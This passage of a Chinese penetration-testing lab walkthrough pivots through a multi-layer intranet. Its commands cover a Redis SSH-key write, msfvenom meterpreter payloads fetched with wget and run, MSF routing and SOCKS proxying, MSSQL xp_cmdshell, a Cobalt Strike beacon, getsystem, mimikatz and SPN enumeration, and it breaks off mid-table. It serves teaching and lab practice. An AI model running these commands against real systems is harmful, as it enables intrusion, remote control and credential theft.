+<li><code>config set dir /root/.ssh</code> → 指定保存到哪个目录</li>
+<li><code>config set dbfilename authorized_keys</code> → 指定文件名</li>
+<li><code>save</code> → 把内存里所有数据（包括公钥）写进 <code>/root/.ssh/authorized_keys</code></li>
+</ul>
+<p>Redis 本来设计这个功能是为了数据备份，结果被拿来写任意文件了，这就是这个漏洞的本质。</p>
+<p><code>authorized_keys</code> 文件里虽然会混入一些 Redis 的杂质数据，但没关系——SSH 读取这个文件时会逐行扫描，找到符合公钥格式（<code>ssh-rsa AAAA...</code>）的行就认，其他杂质行直接忽略。这也是前后加 <code>\n\n</code> 的原因，让公钥单独成行更容易被识别。</p>
+</blockquote>
+<p><strong>第五步：SSH 登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_526g.png"></p>
+<p>输 <code>yes</code> 确认，成功拿下主机。</p>
+<hr>
+<h2 id="三、第一层内网：52-网段信息收集"><a href="#三、第一层内网：52-网段信息收集" class="headerlink" title="三、第一层内网：52 网段信息收集"></a>三、第一层内网：52 网段信息收集</h2><h3 id="发现新网段"><a href="#发现新网段" class="headerlink" title="发现新网段"></a>发现新网段</h3><p>登进去之后看 IP，发现了新网段 <code>192.168.52.x</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3kyp.png"></p>
+<p>机器上没有 nmap，不能直接扫存活 IP。先试试外网：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_bbru.png"></p>
+<p>好消息是可以访问外网，有一条下载工具的后路。先用 arp 看看有没有缓存记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1lzx.png"></p>
+<p>发现了！<code>192.168.52.20</code> 就是内网里的第二台机器。</p>
+<h3 id="翻历史命令找线索"><a href="#翻历史命令找线索" class="headerlink" title="翻历史命令找线索"></a>翻历史命令找线索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_azgt.png"></p>
+<p>找到了一条直接 SSH 连接的命令，试了一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.52.20</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_y7eq.png"></p>
+<p>直接连上了，没有密码，应该是两台机器之间配置了信任关系（共用了 SSH 密钥）。</p>
+<blockquote>
+<p><strong>怎么证明是两台不同的机器？</strong></p>
+<p>看 <code>uname -a</code>：</p>
+<p>第一台机器：<br><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_5vbg.png"></p>
+<p>第二台机器：<br><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_bik7.png"></p>
+<p>虽然环境名显示一样，但内核信息不同，确实是两台独立的机器。</p>
+</blockquote>
+<h3 id="第二台机器信息收集"><a href="#第二台机器信息收集" class="headerlink" title="第二台机器信息收集"></a>第二台机器信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_zoku.png"></p>
+<p>IP 很多，重点只有两个：</p>
+<ul>
+<li><code>eth0</code> → <code>192.168.52.20</code>，连着第一台 Linux</li>
+<li><code>eth1</code> → <code>192.168.93.10</code>，这是新网段！</li>
+<li><code>172.x.x.x</code> 那些是 Docker 虚拟网卡，暂时不管</li>
+</ul>
+<p>机器上依旧没有 nmap，而且是内网机器不能访问外网。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_d87p.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_yms8.png"></p>
+<p>arp 缓存里没有 93 网段的记录，再翻历史命令找找：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>找到了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.93.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_wh3x.png"></p>
+<p>可以通讯，<code>93.128</code> 就是在同一个内网里。还找到了一条：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u micle -p admin 192.168.92.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_x8xm.png"></p>
+<p>这个不知道是小迪做实验留下的还是故意埋的，直接输入发现没有 rdesktop 这个工具，先记着。</p>
+<p>查看端口信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_rrdu.png"></p>
+<p>什么都没有，只有一个 SSH，感觉没啥能直接利用的了。</p>
+<h3 id="传工具：通过中转下载-fscan"><a href="#传工具：通过中转下载-fscan" class="headerlink" title="传工具：通过中转下载 fscan"></a>传工具：通过中转下载 fscan</h3><p>因为第二台机器在内网不能直接访问外网，需要先在第一台主机下载工具，再用 Python 起一个 HTTP 服务来中转。</p>
+<p><strong>第一台 Linux（192.168.52.10）上操作：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/shadow1ng/fscan/releases/download/v2.1.2/fscan_2.1.2_linux_x64</span><br><span class="line"><span class="built_in">chmod</span> +x fscan_2.1.2_linux_x64</span><br><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gfnd.png"></p>
+<p><strong>第二台 Linux（192.168.52.20）上下载：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.52.10:8888/fscan_2.1.2_linux_x64</span><br><span class="line"><span class="built_in">chmod</span> +x fscan_2.1.2_linux_x64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nmgo.png"></p>
+<h3 id="扫-93-网段"><a href="#扫-93-网段" class="headerlink" title="扫 93 网段"></a>扫 93 网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_2.1.2_linux_x64 -h 192.168.93.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_mamm.png"></p>
+<p>没扫到目标（只有自己）。提示 ICMP 响应率过低（0.4%），ICMP 就是 ping 用的协议，Windows 防火墙默认会屏蔽 ping，很有可能被拦了。</p>
+<p>跳过 ICMP 探测，直接扫端口, 并降低线程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_2.1.2_linux_x64 -h 192.168.93.128 -t 50</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其实后来才知道，<code>93.128</code> 这台机器内部 IP 被改成了固定的，所以扫不到。把它改成自动分配（DHCP）之后就可以扫到了。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_whdp.png"></p>
+<p><code>192.168.93.128</code> 有两个重要服务：</p>
+<ul>
+<li><strong>81 端口</strong> → IIS Web 服务，协同管理系统</li>
+<li><strong>1433 端口</strong> → MSSQL 数据库</li>
+</ul>
+<hr>
+<h2 id="四、第二层内网：93-网段-MSF-路由代理"><a href="#四、第二层内网：93-网段-MSF-路由代理" class="headerlink" title="四、第二层内网：93 网段 + MSF 路由代理"></a>四、第二层内网：93 网段 + MSF 路由代理</h2><p>发现 93.128 有 Web 服务，但网络不同，不能直接访问。而且还要跨两层网络，需要代理&#x2F;隧道技术。这里决定用 MSF 来处理路由和代理。</p>
+<h3 id="让第一台-Linux-上线-MSF"><a href="#让第一台-Linux-上线-MSF" class="headerlink" title="让第一台 Linux 上线 MSF"></a>让第一台 Linux 上线 MSF</h3><p><strong>生成 payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=1111 -f elf &gt; 1.elf</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165110969.png"></p>
+<p><strong>Kali 上启动监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.129</span><br><span class="line"><span class="built_in">set</span> LPORT 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165139133.png"></p>
+<p><strong>第一台 Linux 上下载执行：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.129/1.elf</span><br><span class="line"><span class="built_in">chmod</span> +x 1.elf</span><br><span class="line">./1.elf &amp;</span><br></pre></td></tr></table></figure>
+
+<p>&amp; : 后台运行不占用终端会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165200665.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165223344.png"></p>
+<p>成功下载</p>
+<p>MSF 拿到 session 后，添加路由：</p>
+<p>快速添加 52 段的路由</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165253723.png"></p>
+<h3 id="让第二台-Linux-上线-MSF"><a href="#让第二台-Linux-上线-MSF" class="headerlink" title="让第二台 Linux 上线 MSF"></a>让第二台 Linux 上线 MSF</h3><p>因为第二台机器在内网，如果选反向上线，反向的 IP 只能指向第一台 Linux（不能直接指向 Kali），然后还需要第一台 Linux 做端口转发，比较麻烦。所以选择<strong>正向上线（bind_tcp）</strong>，反正没有防火墙阻拦。</p>
+<p>因为已经添加了路由，MSF 会自动处理流量，经过第一台主机转发到第二台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali → MSF路由 → 第一台Linux → 第二台Linux(bind端口)</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成正向 payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=1112 -f elf &gt; 2.elf</span><br></pre></td></tr></table></figure>
+
+<p>文件中转流程（需要过两次）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali 开HTTP → 第一台Linux下载2.elf → 第一台Linux开HTTP → 第二台Linux下载2.elf</span><br></pre></td></tr></table></figure>
+
+<p><strong>Kali 开 HTTP 服务：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一台 Linux 下载并中转：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.129/2.elf</span><br><span class="line"><span class="built_in">chmod</span> +x 2.elf</span><br><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二台 Linux 下载执行：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.52.10:8888/2.elf</span><br><span class="line"><span class="built_in">chmod</span> +x 2.elf</span><br><span class="line">./2.elf &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>MSF 上主动连接：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.52.20</span><br><span class="line"><span class="built_in">set</span> LPORT 1112</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165527732.png"></p>
+<p>成功拿下 session 8、9，两台机器都上线了。</p>
+<p>进入 session 9（第二台 Linux），添加 93 网段路由：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions 9</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165547167.png"></p>
+<p>用 <code>route print</code> 查看路由配置：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165600984.png"></p>
+<ul>
+<li>Session 8（第一台 Linux）→ 处理 1.x 和 52.x 网段</li>
+<li>Session 9（第二台 Linux）→ 处理 93.x 和 172.x 网段</li>
+</ul>
+<h3 id="开-SOCKS-代理访问-93-网段"><a href="#开-SOCKS-代理访问-93-网段" class="headerlink" title="开 SOCKS 代理访问 93 网段"></a>开 SOCKS 代理访问 93 网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> SRVPORT 1080</span><br><span class="line"><span class="built_in">set</span> VERSION 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后配置 proxychains：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"><span class="comment"># 找到最后一行，确认是：</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165641379.png"></p>
+<p>测试一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不用代理（访问不到）</span></span><br><span class="line">curl http://192.168.93.128:81</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用代理（能访问）</span></span><br><span class="line">proxychains curl http://192.168.93.128:81</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，不使用代理是访问不到的，使用了代理就能成功访问得到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165700497.png"></p>
+<p>本机浏览器也配置一下代理插件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165736743.png"></p>
+<p>启动插件访问 , 用浏览器访问 <code>192.168.93.128:81</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165751143.png"></p>
+<p>网络通讯没有问题</p>
+<h3 id="发现-OA-系统"><a href="#发现-OA-系统" class="headerlink" title="发现 OA 系统"></a>发现 OA 系统</h3><p>访问之后发现是<strong>协同办公 v6.3 OA 系统</strong>，经过查询这应该不是主流 CMS</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165828309.png"></p>
+<p>先扫一下目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不能直接这样扫，会把 MSF 会话扫崩</span></span><br><span class="line"><span class="comment"># proxychains dirsearch -u http://192.168.93.128:81</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要限制线程</span></span><br><span class="line">proxychains dirsearch -u http://192.168.93.128:81 -t 50 -x 404,405,403</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong> proxychains 每个请求都会打印一行日志，看起来很乱。可以关掉日志输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"><span class="comment"># 找到 quiet_mode 这行，去掉注释 #</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>结果就是扫着扫着 MSF 直接崩了，又要重新上线。而且内存也不够了，索性和前面一样下线这两台了,  就直接跳过去看 wp，发现有备份源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.128:81/www.rar</span><br></pre></td></tr></table></figure>
+
+<p>下载下来只有一个文件 <code>Job18.config</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170141679.png"></p>
+<p>里面有 MSSQL 的凭据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mssql</span><br><span class="line">sa:admin</span><br></pre></td></tr></table></figure>
+
+<p><code>sa</code> 是 SQL Server 的系统管理员账号，相当于数据库里的 root，是 SQL Server 内置的最高权限账号。</p>
+<hr>
+<h2 id="五、MSSQL-入口：SRV-WEB-KIT-落地"><a href="#五、MSSQL-入口：SRV-WEB-KIT-落地" class="headerlink" title="五、MSSQL 入口：SRV-WEB-KIT 落地"></a>五、MSSQL 入口：SRV-WEB-KIT 落地</h2><h3 id="用-socat-中转端口连接-MSSQL"><a href="#用-socat-中转端口连接-MSSQL" class="headerlink" title="用 socat 中转端口连接 MSSQL"></a>用 socat 中转端口连接 MSSQL</h3><p>Windows 直接连不到 <code>192.168.93.128:1433</code>，可以在 Kali 上建一个 socat 转发：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1433,fork TCP:192.168.93.128:1433</span><br></pre></td></tr></table></figure>
+
+<p>然后 Windows 上的数据库工具连接 <code>192.168.1.129:1433</code>，流量会自动转发到 <code>192.168.93.128:1433</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170357441.png"></p>
+<p>右下角显示连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170414732.png"></p>
+<p>权限是 DBA（Database Administrator，数据库管理员，即最高权限）。</p>
+<h3 id="xp-cmdshell-执行系统命令"><a href="#xp-cmdshell-执行系统命令" class="headerlink" title="xp_cmdshell 执行系统命令"></a>xp_cmdshell 执行系统命令</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170442581.png"></p>
+<p>MSSQL 有几种执行系统命令的方式：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XpCmdshell</td>
+<td>最经典，直接调用 <code>xp_cmdshell</code> 存储过程，默认关闭需要激活</td>
+</tr>
+<tr>
+<td>AgentJob</td>
+<td>通过 SQL Server 代理作业执行命令，可绕过 xp_cmdshell 限制</td>
+</tr>
+<tr>
+<td>CLR</td>
+<td>通过 .NET 公共语言运行时执行命令，更隐蔽</td>
+</tr>
+<tr>
+<td>SpOACreate (COM 组件)</td>
+<td>通过 OLE 自动化对象执行命令</td>
+</tr>
+</tbody></table>
+<p>这些都是 MSSQL 特有的，MySQL&#x2F;Oracle 没有，这也是为什么 MSSQL 在渗透中特别”好用”。</p>
+<p>激活 xp_cmdshell 需要 sa 权限，激活完之后执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootkit\dbadmin</span><br></pre></td></tr></table></figure>
+
+<p>是域用户，说明是域环境。</p>
+<h3 id="收集机器信息"><a href="#收集机器信息" class="headerlink" title="收集机器信息"></a>收集机器信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170533282.png"></p>
+<p>重点信息：</p>
+<ul>
+<li>域：<code>rootkit.org</code> </li>
+<li>机器名：<code>SRV-WEB-KIT</code>，是成员服务器，不是域控</li>
+<li>有两块网卡：<code>192.168.93.128</code> 和 <code>192.168.3.128</code> → 又发现一个新网段</li>
+</ul>
+<hr>
+<h2 id="六、CS-上线、提权、域内信息收集"><a href="#六、CS-上线、提权、域内信息收集" class="headerlink" title="六、CS 上线、提权、域内信息收集"></a>六、CS 上线、提权、域内信息收集</h2><h3 id="CS-上线"><a href="#CS-上线" class="headerlink" title="CS 上线"></a>CS 上线</h3><p>先尝试 PowerShell 上线，好像因为命令太长解析出错了。改用 exe 文件上线：在工具里建立一个监听器（选目标机器能够回连的 IP）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170613154.png"></p>
+<p>然后直接上传 exe 后门文件执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170627633.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/wwwroot/beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170652078.png"></p>
+<p>上线成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170704301.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># rootkit\dbadmin，域用户权限，不是 System，权限比较低</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170719881.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>直接用 CS 内置命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170748265.png"></p>
+<p>提权成功。顺便用 mimikatz 抓一下密码。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170809286.png"></p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p><strong>扫描目标：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170823359.png"></p>
+<ul>
+<li><code>192.168.3.74</code> → DF（Windows 10 PC，有 Defender）</li>
+<li><code>192.168.3.144</code> → OWA2013（Exchange 服务器）</li>
+<li><code>192.168.93.128</code> → 当前机器（SRV-WEB-KIT）</li>
+</ul>
+<p><strong>判断 DC：</strong></p>
+<p>扫描一下端口</p>
+<p><code>192.168.3.144</code> 开放的端口：</p>
+<ul>
+<li>25、587 → SMTP（邮件发送）</li>
+<li>143、993 → IMAP（邮件接收）</li>
+<li>443 → HTTPS（OWA）</li>
+<li><strong>88 → Kerberos</strong></li>
+<li><strong>389 → LDAP</strong></li>
+<li><strong>53 → DNS</strong></li>
+</ul>
+<p>有 88（Kerberos）、389（LDAP）、53（DNS），而且主机名叫 OWA2013，OWA 就是 Outlook Web App，可以直接判断这是 Exchange 服务器，并且很可能也是 DC。</p>
+<p><strong>确认 DC：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net <span class="keyword">time</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170926150.png"></p>
+<p>返回 <code>\\OWA2013.rootkit.org</code>，说明：</p>
+<ul>
+<li>当前处于 <code>rootkit.org</code> 这个 Active Directory 域中</li>
+<li>主域控制器（PDC）的主机名就叫 <code>OWA2013</code></li>
+</ul>
+<p><strong>枚举域内所有 SPN：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T rootkit.org -q */*</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>setspn 说明：</strong></p>
+<ul>
+<li>是 Windows 自带工具，全称 “Set Service Principal Name”（设置服务主体名称）</li>
+<li><code>-T rootkit.org</code>：指定查询目标域</li>
+<li><code>-q */*</code>：查询所有 SPN（通配符匹配所有服务类型和主机名）</li>
+</ul>
+<p><strong>合起来的意思</strong>：连接到 rootkit.org 这个域，查询并列出所有注册的服务主体名称。</p>
+</blockquote>
+<p>低权限直接报错：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_jbb0.png"></p>
+<p>提权后执行成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ufn9.png"></p>
+<blockquote>
+<p><strong>关于 SPN 结果里的 LDAP 路径解读：</strong></p>
+<p>LDAP 路径结构：<code>CN=名字,OU=组织单位,DC=域组件,DC=域组件</code></p>
+<p>例如 <code>DC=rootkit,DC=org</code> 就是域名 <code>rootkit.org</code>。</p>
+<p>CN 不一定是机器名称，怎么判断是机器还是用户？看 OU：</p>
+<table>
+<thead>
+<tr>
+<th>路径特征</th>
+<th>对象类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>OU=Domain Controllers</code></td>
+<td>✅ 机器（域控）</td>
+</tr>
+<tr>
+<td><code>CN=Computers</code></td>
+<td>✅ 机器（普通计算机）</td>
+</tr>
+<tr>
+<td><code>CN=Users</code></td>
+<td>✅ 用户</td>
+</tr>
+</tbody></table>
+<p><strong>域内各目标的攻击价值：</strong></p>
+<table>
+<thead>
+<tr>
+<th>DN</th>
+<th>是什么</th>
+<th>攻击价值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OWA2013</td>
+<td>域控 + Exchange</td>
+<td>🔴 极高</td>
+</tr>
+<tr>
+<td>krbtgt</td>
+<td>Kerberos 金票账户</td>
+<td>🔴 高（拿到哈希后）</td>
+</tr>
+<tr>
